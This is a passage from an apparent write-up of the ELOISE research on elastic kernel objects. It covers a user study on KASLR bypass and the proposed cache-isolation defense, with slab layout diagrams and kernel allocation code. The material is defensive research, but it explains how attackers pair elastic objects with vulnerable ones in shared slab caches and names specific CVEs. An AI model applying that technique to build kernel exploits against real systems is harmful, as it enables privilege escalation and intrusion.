The user study result was stark. Group A with ELOISE bypassed KASLR on all 5 test vulnerabilities. Group B without it succeeded on none of them, getting stuck at the elastic object identification stage with no progress after 24 hours. The researchers concluded that manually searching 14 million lines of kernel code for suitable elastic objects is not practically feasible without tooling.
## Defense: Cache Isolation

The fix ELOISE proposes is straightforward. If elastic objects and non-elastic objects share the same slab cache, an attacker can arrange them adjacently and use one to corrupt the other. Separate them physically and that attack path disappears.

```c
BEFORE:
  kmalloc-16 slab:
  [ldt_struct (elastic)] [(vulnerable)] [ip_options (elastic)] [...]
                          ↑ vuln can corrupt neighbor

AFTER:
  kmalloc-16 (regular):
  [(vulnerable)] [(other)] [(other)] [...]

  kmalloc-isolated-16 (new shadow cache):
  [ldt_struct] [ip_options] [ldt_struct] [ip_options]

  vulnerable objects and elastic objects can never be adjacent
```

Implementation adds a new GFP flag `__GFP_ISOLATE` and creates shadow caches at boot. ELOISE's output tells the kernel which allocation sites need the new flag:

```c
// include/linux/gfp.h
#define __GFP_ISOLATE  ((__force gfp_t)___GFP_ISOLATE)

// mm/slab_common.c
void __init create_kmalloc_caches(slab_flags_t flags) {
    for (int i = KMALLOC_SHIFT_LOW; i <= KMALLOC_SHIFT_HIGH; i++) {
        char name[20];
        snprintf(name, sizeof(name), "kmalloc-isolated-%u", 1 << i);
        kmalloc_isolated_caches[i] =
            kmem_cache_create(name, 1 << i, 0, SLAB_HWCACHE_ALIGN, NULL);
    }
}

// Elastic object allocations get the new flag:
new_ldt = kmalloc(sizeof(*new_ldt), GFP_KERNEL | __GFP_ISOLATE);
//                                              ^^^^^^^^^^^^^^^^
//                                              goes to kmalloc-isolated-16
```

After applying this defense and re-running ELOISE's pairing phase, all but two Linux vulnerabilities (CVE-2017-7184 and CVE-2017-17053) lose their elastic object matches. Those two are themselves elastic objects that ended up in the isolated cache, so they can still manipulate other elastic objects there. But the critical point is that general objects containing function pointers are not in the isolated cache, so the KASLR bypass path through them is broken even in those two remaining cases.

The existing defenses all fall short in comparison. Heap freelist randomization does not stop UAF or double-free exploitation and has already been bypassed by multiple published techniques. Structure layout randomization depends on a random seed that Linux distros have to expose for third-party kernel module compilation. The USERCOPY hardening only checks `copy_from/to_user` and `copyout`, leaving other disclosure channels like `nla_put` and `skb_put_data` unprotected. Cache isolation sidesteps all of these problems at an average performance cost of 0.19%.

---
